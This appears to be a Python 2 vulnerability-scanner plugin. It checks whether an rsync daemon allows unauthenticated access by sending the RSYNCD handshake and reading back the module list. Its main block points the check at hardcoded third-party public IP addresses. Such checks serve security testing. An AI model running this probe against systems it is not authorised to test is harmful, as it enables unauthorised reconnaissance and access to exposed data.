#!/usr/bin/env python
# encoding: utf-8

from ..t import T

import socket
import traceback
import time

class P(T):
    def __init__(self):
        T.__init__(self)

    # extends?
    def verify(self,head='',context='',ip='',port='',productname={},keywords='',hackresults=''):
	print "rsync.py\'s verify"
        result = {}
        result['result']=False
        s=None

        try:
            payload = '\x40\x52\x53\x59\x4e\x43\x44\x3a\x20\x33\x31\x2e\x30\x0a'	# @RSYNCD: 31.0
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            socket.setdefaulttimeout(10)

            s.connect((ip, int(port)))
            print "sending payload..."
            s.sendall(payload)
            time.sleep(2)
            # server init.
            initinfo = s.recv(400)
            print "initinfo", initinfo
            if "RSYNCD" in initinfo:
                s.sendall("\x0a")	#'\n'
                time.sleep(2)
            modulelist = s.recv(200)

            print "modulelist", modulelist
            if len(modulelist) > 0:
                result['result'] = True
                result['VerifyInfo'] = {}
                result['VerifyInfo']['type'] = 'rsync unauth access  vul'
                result['VerifyInfo']['URL'] = ip
                result['VerifyInfo']['Port'] = port
                result['VerifyInfo']['result'] = str(modulelist)
        except Exception,e:
            print e.text, traceback.print_exc()
        finally:
            if s is not None:
                s.close()
            return result

if __name__ == '__main__':
    # print P().verify(ip='61.146.115.83',port='81')
    print P().verify(ip='218.246.86.195', port='873')
